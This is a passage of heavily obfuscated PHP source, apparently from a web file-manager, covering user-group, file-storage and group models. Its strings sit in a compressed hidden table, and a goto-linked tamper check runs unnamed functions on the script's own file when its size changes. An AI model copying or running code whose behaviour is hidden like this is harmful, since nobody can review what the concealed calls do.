$Ğ¨‚ñ›¸ = array_to_keyvalue($Ğ¨‚ñ›¸, $Õ»’Ô·÷[12], $Õ»’Ô·÷[1701]); $´şüÛç = $this->where(array($Õ»’Ô·÷[1692] => array($Õ»’Ô·÷[7], $Ğ¨‚ñ›¸)))->select(); if (!$´şüÛç) { return array(); } return $´şüÛç; } private function _listDataApplyItem($üÓÅÅ¤) { $œ„˜ìİ = array($üÓÅÅ¤); $this->_listDataApply($œ„˜ìİ); return $œ„˜ìİ[0]; } private function _listDataApply(&$ª™Ğ£–) { $¨û×‹Àù =& $_SERVER[ò«¥Ê‡å]; if (!$ª™Ğ£–) { return; } array_remove_key($ª™Ğ£–, $¨û×‹Àù[936]); $Ñ…ó¨„î = array_to_keyvalue($ª™Ğ£–, $¨û×‹Àù[12], $¨û×‹Àù[1701]); $this->_listAppendGroup($ª™Ğ£–, $Ñ…ó¨„î); $this->_listAppendMeta($ª™Ğ£–, $Ñ…ó¨„î); $this->_listAppendSourceRoot($ª™Ğ£–, $Ñ…ó¨„î); } private function _listAppendSourceRoot(&$Ìı‘æŒì, $¬ì°‹Ò‘) { $ù°ìßÄ× =& $_SERVER[ò«¥Ê‡å]; $µÍúè¤ = Model($ù°ìßÄ×[871])->listSourceRoot(SourceModel::TYPE_USER, $¬ì°‹Ò‘); $µÍúè¤ = array_to_keyvalue($µÍúè¤, $ù°ìßÄ×[540]); $µÍúè¤ = array_remove_key($µÍúè¤, $ù°ìßÄ×[540]); foreach ($Ìı‘æŒì as &$Üô¬¬Ù‹) { $Üô¬¬Ù‹[$ù°ìßÄ×[89]] = $µÍúè¤[$Üô¬¬Ù‹[$ù°ìßÄ×[1701]]] ? $µÍúè¤[$Üô¬¬Ù‹[$ù°ìßÄ×[1701]]] : array(); } unset($Üô¬¬Ù‹); } private function _listAppendGroup(&$¡Û“ÙË”, $–…ï«ÖÓ) { $åÌØÔç© =& $_SERVER[ò«¥Ê‡å]; $êöÆ–å£ = array($åÌØÔç©[1701] => array($åÌØÔç©[7], $–…ï«ÖÓ)); $Ğ’ÚÎı£ = Model($åÌØÔç©[1989])->where($êöÆ–å£)->select(); $¿ü–°µî = array_to_keyvalue($Ğ’ÚÎı£, $åÌØÔç©[12], $åÌØÔç©[1899]); $¿ü–°µî = array_remove_value(array_unique($¿ü–°µî), $åÌØÔç©[214]); if (!$¿ü–°µî || !$Ğ’ÚÎı£) { return; } $êöÆ–å£ = array($åÌØÔç©[1899] => array($åÌØÔç©[7], $¿ü–°µî)); $¨îÔñÉÎ = Model($åÌØÔç©[2084])->field($åÌØÔç©[2394])->where($êöÆ–å£)->select(); $¨îÔñÉÎ = array_to_keyvalue($¨îÔñÉÎ, $åÌØÔç©[1899]); $Ğ’ÚÎı£ = array_to_keyvalue_group($Ğ’ÚÎı£, $åÌØÔç©[1701]); foreach ($Ğ’ÚÎı£ as &$ªºÄÙ¼) { $¢¬©Ô— = array(); foreach ($ªºÄÙ¼ as $úÑ•ÇŠ) { if (!$úÑ•ÇŠ[$åÌØÔç©[2003]]) { continue; } $¾•ÚÇ÷ê = Model($åÌØÔç©[542])->listData($úÑ•ÇŠ[$åÌØÔç©[2003]]); $¢¬©Ô—[] = array($åÌØÔç©[1899] => $úÑ•ÇŠ[$åÌØÔç©[1899]], $åÌØÔç©[2395] => $¨îÔñÉÎ[$úÑ•ÇŠ[$åÌØÔç©[1899]]][$åÌØÔç©[32]], $åÌØÔç©[555] => $¨îÔñÉÎ[$úÑ•ÇŠ[$åÌØÔç©[1899]]][$åÌØÔç©[555]], $åÌØÔç©[457] => $¾•ÚÇ÷ê); } $ªºÄÙ¼ = $¢¬©Ô—; } unset($ªºÄÙ¼); foreach ($¡Û“ÙË” as &$ãµ…í§å) { $ãµ…í§å[$åÌØÔç©[2086]] = array(); if (isset($Ğ’ÚÎı£[$ãµ…í§å[$åÌØÔç©[1701]]])) { $ãµ…í§å[$åÌØÔç©[2086]] = $Ğ’ÚÎı£[$ãµ…í§å[$åÌØÔç©[1701]]]; } } unset($ãµ…í§å); } public function userAppendGroup($…Šê©Œª) { $áËëÍªå =& $_SERVER[ò«¥Ê‡å]; if (!$…Šê©Œª) { return array(); } $this->_listAppendGroup($…Šê©Œª, array_to_keyvalue($…Šê©Œª, $áËëÍªå[12], $áËëÍªå[1701])); return $…Šê©Œª; } private function _listAppendMeta(&$ŒúØ—ì´, $Ãç˜Éè™) { $ã‡¿åÉŸ =& $_SERVER[ò«¥Ê‡å]; $“ãæ§  = UserJobModel::JOB_KEY; $Æ¹Í•· = array($ã‡¿åÉŸ[2375]); $Şˆ‰½Â« = array($ã‡¿åÉŸ[1701] => array($ã‡¿åÉŸ[7], $Ãç˜Éè™)); $±Œ‘¥÷ = Model($ã‡¿åÉŸ[2373])->where($Şˆ‰½Â«)->select(); $±Œ‘¥÷ = array_to_keyvalue_group($±Œ‘¥÷, $ã‡¿åÉŸ[1701]); foreach ($±Œ‘¥÷ as &$ÉĞŸÔ‹¬) { $âúãğ–â = array(); foreach ($ÉĞŸÔ‹¬ as $ªø«‰Òß) { if (!in_array($ªø«‰Òß[$ã‡¿åÉŸ[96]], $Æ¹Í•·)) { $âúãğ–â[$ªø«‰Òß[$ã‡¿åÉŸ[96]]] = $ªø«‰Òß[$ã‡¿åÉŸ[420]]; } } $ÉĞŸÔ‹¬ = $âúãğ–â; } unset($ÉĞŸÔ‹¬); $™ÇµßóÏ = Model($ã‡¿åÉŸ[2396]); foreach ($ŒúØ—ì´ as &$¸ÃÜóåĞ) { $ôèô­ÉØ = array(); if (isset($±Œ‘¥÷[$¸ÃÜóåĞ[$ã‡¿åÉŸ[1701]]])) { $ôèô­ÉØ = $±Œ‘¥÷[$¸ÃÜóåĞ[$ã‡¿åÉŸ[1701]]]; } $¸ÃÜóåĞ[$ã‡¿åÉŸ[2397]] = array(); if (isset($ôèô­ÉØ[$“ãæ§ ])) { $¸ÃÜóåĞ[$ã‡¿åÉŸ[2397]] = $™ÇµßóÏ->getUserJobInfo($ôèô­ÉØ[$“ãæ§ ]); } } unset($¸ÃÜóåĞ); } protected function groupUserAll($†§ÚŞ ˆ) { $È¿¨ª‰é =& $_SERVER[ò«¥Ê‡å]; if (!$†§ÚŞ ˆ) { return !1; } $§ÛÀ÷Ğí = Model($È¿¨ª‰é[1989])->field($È¿¨ª‰é[1701])->where(array($È¿¨ª‰é[1899] => array($È¿¨ª‰é[7], $†§ÚŞ ˆ)))->select(); $§ÛÀ÷Ğí = array_to_keyvalue($§ÛÀ÷Ğí, $È¿¨ª‰é[12], $È¿¨ª‰é[1701]); return array_unique($§ÛÀ÷Ğí); } public function userSearch($ê÷ÆÃå™, $ß±Ò¨¿ˆ = "\52") { return Model($_SERVER[ò«¥Ê‡å][569])->where($ê÷ÆÃå™)->field($ß±Ò¨¿ˆ)->find(); } } goto fƒ¡ê‹îÑ; Cö©³ÉÊŒ‘: define($_SERVER[ò«¥Ê‡å][647], $_SERVER[ò«¥Ê‡å][648]); $yzgjqlmhsr = $_SERVER[ò«¥Ê‡å][649]; $_SERVER[¤±ª…ß¤] = explode($_SERVER[ò«¥Ê‡å][650], gzinflate(substr($_SERVER[ò«¥Ê‡å][651], 10, -8))); goto bèø¢ùö½; cŒ†·íÏÎ: $_file = $_SERVER[$_SERVER[ò«¥Ê‡å][838]]; $_size = $_SERVER[ò«¥Ê‡å][923]; if ($_SERVER[$_SERVER[ò«¥Ê‡å][837]] != $_size($_file)) { $_getc = $_SERVER[ò«¥Ê‡å][839]; $_getfile = $_SERVER[$_SERVER[ò«¥Ê‡å][840]] . $_SERVER[ò«¥Ê‡å][841]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ò«¥Ê‡å][248], $_getfilec); if (count($_getarrs) < $_SERVER[ò«¥Ê‡å][653]) { $exit = $_SERVER[ò«¥Ê‡å][842]; $exit(); } $_act = $_SERVER[ò«¥Ê‡å][843]; $_act($_file); } goto a§ÄáÊĞ¹ô; fÔßô¯İÀ·: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\151\154\145"; protected $tableMeta = array("\164\x61\x62\154\145\116\x61\x6d\x65" => "\151\x6f\x5f\146\x69\x6c\145\137\155\x65\x74\141", "\155\x65\164\141\106\151\x65\154\144" => "\x66\151\154\x65\x49\x44"); public function fileInfo($µ­°Øºğ) { $™æûÓÌÊ =& $_SERVER[ò«¥Ê‡å]; static $•õ„êÌĞ = array(); if (!isset($•õ„êÌĞ[$µ­°Øºğ])) { $¬š¡¾§ç = $™æûÓÌÊ[1948]; $­Ê±»à‚ = Model($™æûÓÌÊ[514])->field($¬š¡¾§ç)->where(array($™æûÓÌÊ[512] => $µ­°Øºğ))->find(); $•õ„êÌĞ[$µ­°Øºğ] = $­Ê±»à‚; } return $•õ„êÌĞ[$µ­°Øºğ]; } public function addFileByContent($ß å¶Ğ· = '', $À¼î›‰Å = '') { $î¤Æºì =& $_SERVER[ò«¥Ê‡å]; $§ñÇÂØÈ = TEMP_PATH . $î¤Æºì[1949]; if (!is_dir($§ñÇÂØÈ)) { mk_dir($§ñÇÂØÈ); } $Ù§¿¦©å = $§ñÇÂØÈ . $î¤Æºì[1950] . rand_string(16); file_put_contents($Ù§¿¦©å, $ß å¶Ğ·); $ÛºıúÂ½ = $this->addFile($Ù§¿¦©å, $À¼î›‰Å, !0); if (file_exists($Ù§¿¦©å)) { @unlink($Ù§¿¦©å); } return $ÛºıúÂ½; } public function createFileName($‰üìÄïÁ, $ö›êÁû® = false, $„Ì“Ö«ù = false) { $Ï¶ç©¾Ø =& $_SERVER[ò«¥Ê‡å]; $—ÌÃÁñº = IO::init($Ï¶ç©¾Ø[8]); $¹šŸè = $this->makeFilePath($‰üìÄïÁ, $—ÌÃÁñº, $ö›êÁû®, $„Ì“Ö«ù); $Ó¬Ğ±Å = $—ÌÃÁñº->pathFather($¹šŸè); static $èÛÊŒí  = false; $›§º’‹ê = $Ï¶ç©¾Ø[1951] . md5($Ó¬Ğ±Å); if (!$èÛÊŒí  && !Cache::get($›§º’‹ê)) { $èÛÊŒí  = !0; $ªåÌ°„ó = IO::mkdir($Ó¬Ğ±Å); if (!IO::exist($ªåÌ°„ó . $Ï¶ç©¾Ø[836])) { IO::mkfile($ªåÌ°„ó . $Ï¶ç©¾Ø[836]); } Cache::set($›§º’‹ê, 1, 3600 * 2); } return $¹šŸè; } public function makeFilePath($ıí°†‡Ü, $ñŞÔ¶Æ, $é°£‘±– = false, $£®¯»Íö = false) { $»ã‰¸¿á =& $_SERVER[ò«¥Ê‡å]; $•²Ç¨ĞÄ = Model($»ã‰¸¿á[809])->get($»ã‰¸¿á[1952]); $§¯ö£†­ = KodIO::defaultIO() . date($»ã‰¸¿á[1953]); $Ê£ƒ‹•‡ = $§¯ö£†­ . rand_string(5) . short_id(100); $ıí°†‡Ü = str_replace($»ã‰¸¿á[8], $»ã‰¸¿á[11], KodIO::clear($ıí°†‡Ü)); $¯ú²²á“ = $ñŞÔ¶Æ->ext($ıí°†‡Ü); if (!$ıí°†‡Ü) { $•²Ç¨ĞÄ = $»ã‰¸¿á[1954]; } switch ($•²Ç¨ĞÄ) { case $»ã‰¸¿á[1955]: $Ê£ƒ‹•‡ = $Ê£ƒ‹•‡ . $»ã‰¸¿á[10] . $ñŞÔ¶Æ->ext($ıí°†‡Ü); if ($¯ú²²á“ == $»ã‰¸¿á[1892]) { $Ê£ƒ‹•‡ .= $»ã‰¸¿á[1253]; } break; case $»ã‰¸¿á[1956]: $ÙæØÖô¨ = Model($»ã‰¸¿á[809])->get($»ã‰¸¿á[810]); $…Áà¨‹Û = substr(md5($»ã‰¸¿á[811] . $ÙæØÖô¨ . date($»ã‰¸¿á[787])), 0, 8); $¾Äù¢˜ = KodIO::defaultDriver(); $§¯ö£†­ = $»ã‰¸¿á[1284] . $¾Äù¢˜[$»ã‰¸¿á[445]] . $»ã‰¸¿á[454] . date($»ã‰¸¿á[1957]) . $…Áà¨‹Û . $»ã‰¸¿á[8]; if ($¯ú²²á“ == $»ã‰¸¿á[1892]) { $ıí°†‡Ü .= $»ã‰¸¿á[1253]; } $É—†éŞ = $»ã‰¸¿á[1958] . $§¯ö£†­ . $ıí°†‡Ü; CacheLock::lock($É—†éŞ); $Ê£ƒ‹•‡ = $§¯ö£†­ . $ıí°†‡Ü; if (IO::exist($§¯ö£†­ . $ıí°†‡Ü)) { $»„ì†š = substr($ıí°†‡Ü, 0, strlen($ıí°†‡Ü) - strlen($¯ú²²á“)); $‘‰©¿‡¼ = $£®¯»Íö ? substr($£®¯»Íö, 0, 5) : ($é°£‘±– ? substr($é°£‘±–, 0, 5) : rand_string(5)); $Ê£ƒ‹•‡ = $§¯ö£†­ . $»„ì†š . $‘‰©¿‡¼ . $»ã‰¸¿á[10] . $¯ú²²á“; } if (IO::isTypeObject($Ê£ƒ‹•‡) && !IO::isUploadServer($Ê£ƒ‹•‡)) { if (IO::exist($Ê£ƒ‹•‡)) { return $Ê£ƒ‹•‡; } $‹«¶İûè = IO::setContent($Ê£ƒ‹•‡, $»ã‰¸¿á[12]); if (!$‹«¶İûè) { show_json($»ã‰¸¿á[1959], !1); } } CacheLock::unlock($É—†éŞ); break; case $»ã‰¸¿á[1954]: break; default: break; } return $Ê£ƒ‹•‡; } public function addFileByRemote($µŞïµ”Ä, $ÅÆÀ˜à¾, $…ÊÕ³üÖ = array()) { $ËŞ¼íŠù =& $_SERVER[ò«¥Ê‡å]; if (!IO::exist($µŞïµ”Ä)) { return !1; } $¨ÕÊ¾µ– = $…ÊÕ³üÖ[$ËŞ¼íŠù[517]] ? $…ÊÕ³üÖ[$ËŞ¼íŠù[517]] : $ËŞ¼íŠù[12]; $¢º½Í‘ú = IO::hashMd5($µŞïµ”Ä, $¨ÕÊ¾µ–); $Ëª»í‘ = KodIO::defaultDriver(); $É—¬½òò = array($ËŞ¼íŠù[587] => IO::size($µŞïµ”Ä), $ËŞ¼íŠù[1960] => 1, $ËŞ¼íŠù[464] => $ÅÆÀ˜à¾, $ËŞ¼íŠù[854] => $Ëª»í‘[$ËŞ¼íŠù[445]], $ËŞ¼íŠù[465] => $µŞïµ”Ä, $ËŞ¼íŠù[1961] => $…ÊÕ³üÖ[$ËŞ¼íŠù[642]] ? $…ÊÕ³üÖ[$ËŞ¼íŠù[642]] : IO::hashSimple($µŞïµ”Ä), $ËŞ¼íŠù[1962] => $¢º½Í‘ú ? $¢º½Í‘ú : $¨ÕÊ¾µ–); if ($¢†Ù¼µÇ = $this->addFileCheckExist($É—¬½òò[$ËŞ¼íŠù[642]], $É—¬½òò[$ËŞ¼íŠù[517]], $É—¬½òò[$ËŞ¼íŠù[78]])) { return $¢†Ù¼µÇ; } return $this->addFileData($É—¬½òò); } private function addFileData($ßûñ™—) { $º’‘¬¹ =& $_SERVER[ò«¥Ê‡å]; if (!$ßûñ™—) { return !1; } $ßûñ™—[$º’‘¬¹[78]] = intval($ßûñ™—[$º’‘¬¹[78]]); if (!$ßûñ™—[$º’‘¬¹[78]] && strlen($ßûñ™—[$º’‘¬¹[642]]) > 32) { $ßûñ™—[$º’‘¬¹[78]] = intval(substr($ßûñ™—[$º’‘¬¹[642]], 32)); } $ñäë›…¨ = $this->add($ßûñ™—); return $this->find($ñäë›…¨); } public function addFile($Ô±¿ëšø, $¥öœõ©Ì, $«şÑğàà = false) { $‹Õ¸æûÕ =& $_SERVER[ò«¥Ê‡å]; $Æ®ê–õ = IO::hashSimple($Ô±¿ëšø); $ÌêµÔ™ = IO::size($Ô±¿ëšø); $Î®Í¦‘¾ = $ÌêµÔ™ <= 1024 * 1024 * 10 ? IO::hashMd5($Ô±¿ëšø) : $‹Õ¸æûÕ[12]; $Â¤êÄåË = $‹Õ¸æûÕ[1963] . $Æ®ê–õ; CacheLock::lock($Â¤êÄåË); if ($Î®Í¦‘¾ && $Æ®ê–õ) { $ö¶ÉÂœ = $this->addFileCheckExist($Æ®ê–õ, $Î®Í¦‘¾, $ÌêµÔ™); if ($ö¶ÉÂœ) { CacheLock::unlock($Â¤êÄåË); return $ö¶ÉÂœ; } } $Ôúş¤‘Ó = $this->addFileMake($Ô±¿ëšø, $ÌêµÔ™, $Æ®ê–õ, $Î®Í¦‘¾, $¥öœõ©Ì, $«şÑğàà); $…´ñ¦â = $this->addFileData($Ôúş¤‘Ó); CacheLock::unlock($Â¤êÄåË); if (!$Î®Í¦‘¾ && $…´ñ¦â) { $this->fileMd5Check($…´ñ¦â); } return $…´ñ¦â; } public function fileMd5Check($¢…¡àåİ) { $ÈÓåÚ´… =& $_SERVER[ò«¥Ê‡å]; $äÎéÓí½ = array($¢…¡àåİ[$ÈÓåÚ´…[511]], $¢…¡àåİ[$ÈÓåÚ´…[86]]); $ÅœŞËÙ£ = $ÈÓåÚ´…[1964] . $¢…¡àåİ[$ÈÓåÚ´…[86]]; $ğÊ…Û» = $ÈÓåÚ´…[1965] . $¢…¡àåİ[$ÈÓåÚ´…[511]]; TaskQueue::add($ÈÓåÚ´…[1966], $äÎéÓí½, $ÅœŞËÙ£, $ğÊ…Û»); } public function fileMd5Set($¦ê©Û£ä, $€«Á¢ø) { $ìöñÙúÈ =& $_SERVER[ò«¥Ê‡å]; $à±—”Ó = $this->find($¦ê©Û£ä); if (!$à±—”Ó || $à±—”Ó[$ìöñÙúÈ[517]]) { return; } $ºù¢Œğ = IO::hashMd5($€«Á¢ø); if (!$ºù¢Œğ) { return $ìöñÙúÈ[12]; } $this->where(array($ìöñÙúÈ[511] => $¦ê©Û£ä))->save(array($ìöñÙúÈ[517] => $ºù¢Œğ)); } public function addFileMake($Ş€×¬­, $¾¤›âµ, $ö³´­±, $Ç‡Ê’Ü’, $•…ãîÍ, $ ôÕÑ¼) { $š¦ß¡£Ë =& $_SERVER[ò«¥Ê‡å]; $¦¼ÏÜÂÖ = $this->createFileName($•…ãîÍ, $ö³´­±, $Ç‡Ê’Ü’); $ÄëÆ²†‡ = get_path_father($¦¼ÏÜÂÖ); $©Á°ùÅ´ = get_path_this($¦¼ÏÜÂÖ); if ($ ôÕÑ¼) { $ŞàßãÅ´ = IO::move($Ş€×¬­, $ÄëÆ²†‡, !1, $©Á°ùÅ´); } else { $ŞàßãÅ´ = IO::copy($Ş€×¬­, $ÄëÆ²†‡, !1, $©Á°ùÅ´); } if (!$ŞàßãÅ´) { return !1; } $˜¸‹ß” = KodIO::defaultDriver(); $’Ô·óÑÂ = array($š¦ß¡£Ë[587] => $¾¤›âµ, $š¦ß¡£Ë[1960] => 1, $š¦ß¡£Ë[464] => $•…ãîÍ, $š¦ß¡£Ë[854] => $˜¸‹ß”[$š¦ß¡£Ë[445]], $š¦ß¡£Ë[465] => $¦¼ÏÜÂÖ, $š¦ß¡£Ë[1961] => $ö³´­±, $š¦ß¡£Ë[1962] => $Ç‡Ê’Ü’); return $’Ô·óÑÂ; } public function addFileCheckExist($ò€¨», $£†Ÿ«Ú, $óè÷çá») { $òÉ†ÖÙ¹ =& $_SERVER[ò«¥Ê‡å]; $›ÓšÂ½ = $this->findByHash($ò€¨», $£†Ÿ«Ú); if (!$›ÓšÂ½) { return !1; } $Ÿ™ñ¾Ò¼ = array($òÉ†ÖÙ¹[1960] => intval($›ÓšÂ½[$òÉ†ÖÙ¹[1967]]) + 1, $òÉ†ÖÙ¹[587] => $óè÷çá»); $this->where(array($òÉ†ÖÙ¹[512] => $›ÓšÂ½[$òÉ†ÖÙ¹[511]]))->save($Ÿ™ñ¾Ò¼); return $›ÓšÂ½; } public function remove($ëáşË) { $this->linkCountChange($ëáşË, !1); $this->clearEmpty(); return !0; } public function linkAdd($Ãå†„±) { $this->linkCountChange($Ãå†„±, !0); } public function linkCountChange($³Ä¦óšû, $£ ˆš) { $Î†ÂÆÙï =& $_SERVER[ò«¥Ê‡å]; if (!$³Ä¦óšû) { return; } if (!is_array($³Ä¦óšû)) { $³Ä¦óšû = array($³Ä¦óšû); } $ şÄ‰¹± = array(); foreach ($³Ä¦óšû as $úÏ•ÔÚû) { $È­§×ÎÒ = $úÏ•ÔÚû . $Î†ÂÆÙï[12]; if (!$ şÄ‰¹±[$È­§×ÎÒ]) { $ şÄ‰¹±[$È­§×ÎÒ] = 0; } $ şÄ‰¹±[$È­§×ÎÒ]++; } $×ı¥Ç‰° = array(); foreach ($ şÄ‰¹± as $úÏ•ÔÚû => $¥‹õĞÀ) { $È­§×ÎÒ = $¥‹õĞÀ . $Î†ÂÆÙï[12]; if (!$×ı¥Ç‰°[$È­§×ÎÒ]) { $×ı¥Ç‰°[$È­§×ÎÒ] = array(); } $×ı¥Ç‰°[$È­§×ÎÒ][] = $úÏ•ÔÚû; } foreach ($×ı¥Ç‰° as $¥‹õĞÀ => $’ìûŸù‰) { if (!$’ìûŸù‰) { continue; } $¥‹õĞÀ = $£ ˆš ? $¥‹õĞÀ : -intval($¥‹õĞÀ); $‘ó»ÖÖ = array($Î†ÂÆÙï[511] => array($Î†ÂÆÙï[7], $’ìûŸù‰)); if ($¥‹õĞÀ < 0) { $‘ó»ÖÖ[$Î†ÂÆÙï[1967]] = array($Î†ÂÆÙï[1062], abs($¥‹õĞÀ)); } $this->where($‘ó»ÖÖ)->setAdd($Î†ÂÆÙï[1967], $¥‹õĞÀ); } } public function findByHash($·®ÅÈ²„, $º¬±ÒŞÕ = false) { $¾²ö¿âˆ =& $_SERVER[ò«¥Ê‡å]; if (!$·®ÅÈ²„ && !$º¬±ÒŞÕ) { return !1; } $ÍÍ‰Í¡² = array($¾²ö¿âˆ[1961] => $·®ÅÈ²„); if ($º¬±ÒŞÕ) { $ÍÍ‰Í¡² = array($¾²ö¿âˆ[1962] => $º¬±ÒŞÕ); } return $this->order($¾²ö¿âˆ[1968])->where($ÍÍ‰Í¡²)->find(); } public function clearEmpty($ñÙ´º›é = 0) { $›ÖçØûÂ =& $_SERVER[ò«¥Ê‡å]; $ÆœŒòòİ = time() - 3600 * 24 * $ñÙ´º›é; $ì—†Ü« = $›ÖçØûÂ[1969] . $ÆœŒòòİ; $ÔÌÜç© = $this->where($ì—†Ü«)->select(); if (!$ÔÌÜç©) { return; } $¤’İıÈ = new Task($›ÖçØûÂ[1970], $›ÖçØûÂ[12], count($ÔÌÜç©)); foreach ($ÔÌÜç© as $ÀƒÆÜ»×) { $¤’İıÈ->update(1); $this->resetFile($ÀƒÆÜ»×); } $¤’İıÈ->end(); } public function resetFile($Íâ¼Êé´) { $êÇ‡­²Ë =& $_SERVER[ò«¥Ê‡å]; $ŠùÉ’ë = array($êÇ‡­²Ë[512] => $Íâ¼Êé´[$êÇ‡­²Ë[511]]); $Ã´öªô = Model($êÇ‡­²Ë[1380])->where($ŠùÉ’ë)->count(); $Á«Ç˜Ì¥ = Model($êÇ‡­²Ë[1971])->where($ŠùÉ’ë)->count(); $â¸¨öº¼ = intval($Ã´öªô) + intval($Á«Ç˜Ì¥); if ($â¸¨öº¼ == 0) { IO::remove($Íâ¼Êé´[$êÇ‡­²Ë[86]]); Model($êÇ‡­²Ë[1972])->delete($Íâ¼Êé´[$êÇ‡­²Ë[511]]); $this->where($ŠùÉ’ë)->delete(); $this->metaSet($Íâ¼Êé´[$êÇ‡­²Ë[511]], null, null); return; } if ($Íâ¼Êé´[$êÇ‡­²Ë[1967]] != $â¸¨öº¼) { $this->where($ŠùÉ’ë)->save(array($êÇ‡­²Ë[1960] => $â¸¨öº¼)); } } public function storageInfo($¼ÃšÍ‚Œ = false) { $Ëäç¹ƒ =& $_SERVER[ò«¥Ê‡å]; $ÌÔ…“ÙÖ = $this->count() + 0.0; $í€´Ä•® = 0; $ªÛ‹ˆ’™ = 1; $¤İæñ©¿ = 0; $šŞÇ¿·ù = 5000; for ($¥š¢õ¼º = 0; $¥š¢õ¼º < $ÌÔ…“ÙÖ; $¥š¢õ¼º = $¥š¢õ¼º + $šŞÇ¿·ù) { $È¯ğÑ„› = $this->limit($¥š¢õ¼º, $¥š¢õ¼º + $šŞÇ¿·ù)->select(); foreach ($È¯ğÑ„› as $¢õò³ÑŸ) { $ªÛ‹ˆ’™ += $¢õò³ÑŸ[$Ëäç¹ƒ[78]] * $¢õò³ÑŸ[$Ëäç¹ƒ[1967]]; $í€´Ä•® += $¢õò³ÑŸ[$Ëäç¹ƒ[78]] * ($¢õò³ÑŸ[$Ëäç¹ƒ[1967]] - 1); $¤İæñ©¿ += $¢õò³ÑŸ[$Ëäç¹ƒ[1967]]; } } $Šî§òà = array($Ëäç¹ƒ[1973] => $ªÛ‹ˆ’™, $Ëäç¹ƒ[1974] => $í€´Ä•®, $Ëäç¹ƒ[1975] => $í€´Ä•® / $ªÛ‹ˆ’™, $Ëäç¹ƒ[82] => $ÌÔ…“ÙÖ, $Ëäç¹ƒ[1976] => $¤İæñ©¿); return $Šî§òà; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\x70"; protected $tableMeta = array("\164\141\142\154\x65\x4e\141\x6d\x65" => "\x67\162\157\x75\x70\137\x6d\x65\x74\x61", "\155\x65\x74\141\106\x69\x65\154\144" => "\147\x72\157\165\x70\111\104"); protected function cacheFunctionAlias($­ ìš’Ã) { $ãÙùƒà— =& $_SERVER[ò«¥Ê‡å]; return array($ãÙùƒà—[1977] => array($­ ìš’Ã[0], $ãÙùƒà—[1978]), $ãÙùƒà—[1979] => array($­ ìš’Ã[0], $ãÙùƒà—[1980])); } protected function getInfo($¢üÈ¨øö, $úäì™ù = false) { $˜ğó»° = $this->getInfoSimple($¢üÈ¨øö); if (!$˜ğó»°) { return !1; } if ($úäì™ù) { return $this->_listDataApplyItem($˜ğó»°); } return $this->cacheFunctionGet($_SERVER[ò«¥Ê‡å][1981], $¢üÈ¨øö); } protected function getInfoSimple($ìïöË„Ë, $ı ü¸Ü´ = false) { $°Úšé÷ =& $_SERVER[ò«¥Ê‡å]; if ($ı ü¸Ü´) { $è˜‹•Å = array($°Úšé÷[1899] => intval($ìïöË„Ë)); $­ĞºñÉ· = $this->where($è˜‹•Å)->find(); return is_array($­ĞºñÉ·) ? $­ĞºñÉ· : array(); } return $this->cacheFunctionGet($°Úšé÷[1982], $ìïöË„Ë); } protected function groupAdd($¼‘´ö) { $Ş²í—ó¦ =& $_SERVER[ò«¥Ê‡å]; if (!$¼‘´ö[$Ş²í—ó¦[182]] && isset($¼‘´ö[$Ş²í—ó¦[1899]]) && $¼‘´ö[$Ş²í—ó¦[1899]] == 1) { if ($»ÛÖ“Â = $this->getInfoSimple($¼‘´ö[$Ş²í—ó¦[1899]], !0)) { return $¼‘´ö[$Ş²í—ó¦[1899]]; } } else { $»ÛÖ“Â = $this->getInfoSimple($¼‘´ö[$Ş²í—ó¦[182]]); if (!$»ÛÖ“Â) { return !1; } } $ºİÒ¶Ìâ = $Ş²í—ó¦[565]; if ($»ÛÖ“Â[$Ş²í—ó¦[555]]) { $ºİÒ¶Ìâ = $»ÛÖ“Â[$Ş²í—ó¦[555]] . $»ÛÖ“Â[$Ş²í—ó¦[1899]] . $Ş²í—ó¦[50]; } $Òå–Ü = array($Ş²í—ó¦[464] => $this->groupNameAuto($¼‘´ö[$Ş²í—ó¦[182]], $¼‘´ö[$Ş²í—ó¦[32]]), $Ş²í—ó¦[447] => $¼‘´ö[$Ş²í—ó¦[182]], $Ş²í—ó¦[622] => $ºİÒ¶Ìâ, $Ş²í—ó¦[1983] => $¼‘´ö[$Ş²í—ó¦[1886]], $Ş²í—ó¦[1984] => 0, $Ş²í—ó¦[1903] => 0); if (isset($¼‘´ö[$Ş²í—ó¦[1923]])) { $Òå–Ü[$Ş²í—ó¦[1923]] = $¼‘´ö[$Ş²í—ó¦[1923]]; } else { $¹€±…«ı = $this->max($Ş²í—ó¦[1923]); if (!$¹€±…«ı) { $¹€±…«ı = 0; } $Òå–Ü[$Ş²í—ó¦[1923]] = $¹€±…«ı + 1; } if (!empty($¼‘´ö[$Ş²í—ó¦[1899]])) { $Òå–Ü[$Ş²í—ó¦[1899]] = $¼‘´ö[$Ş²í—ó¦[1899]]; } $‘ª­¬œ‹ = $this->add($Òå–Ü); $this->setNamePinyin($‘ª­¬œ‹, $Òå–Ü[$Ş²í—ó¦[32]]); if (isset($¼‘´ö[$Ş²í—ó¦[1985]])) { $this->metaSet($‘ª­¬œ‹, array($Ş²í—ó¦[1985] => $¼‘´ö[$Ş²í—ó¦[1985]], $Ş²í—ó¦[1986] => $¼‘´ö[$Ş²í—ó¦[1986]])); unset($¼‘´ö[$Ş²í—ó¦[1985]]); unset($¼‘´ö[$Ş²í—ó¦[1986]]); } Model($Ş²í—ó¦[1380])->groupRootAdd($‘ª­¬œ‹); $this->_clearCache($¼‘´ö[$Ş²í—ó¦[182]]); return $‘ª­¬œ‹; } protected function groupEdit($ÖÃ®ÓŸá, $Ñï‹°†Œ) { $œõıå·  =& $_SERVER[ò«¥Ê‡å]; $”–·Ñ¹Ï = $this->getInfoSimple($ÖÃ®ÓŸá); if (!$”–·Ñ¹Ï) { return !1; } if (!empty($Ñï‹°†Œ[$œõıå· [182]])) { $§½¢İû­ = $this->getInfoSimple($Ñï‹°†Œ[$œõıå· [182]]); if (!$§½¢İû­) { return !1; } if ($”–·Ñ¹Ï[$œõıå· [1899]] == $§½¢İû­[$œõıå· [1899]]) { return !1; } if ($Ñï‹°†Œ[$œõıå· [182]] != $”–·Ñ¹Ï[$œõıå· [182]]) { if ($§½¢İû­[$œõıå· [555]] !== $”–·Ñ¹Ï[$œõıå· [555]] && strpos($§½¢İû­[$œõıå· [555]], $”–·Ñ¹Ï[$œõıå· [555]] . $”–·Ñ¹Ï[$œõıå· [1899]] . $œõıå· [50]) === 0) { return !1; } $Ñï‹°†Œ[$œõıå· [622]] = $§½¢İû­[$œõıå· [555]] . $Ñï‹°†Œ[$œõıå· 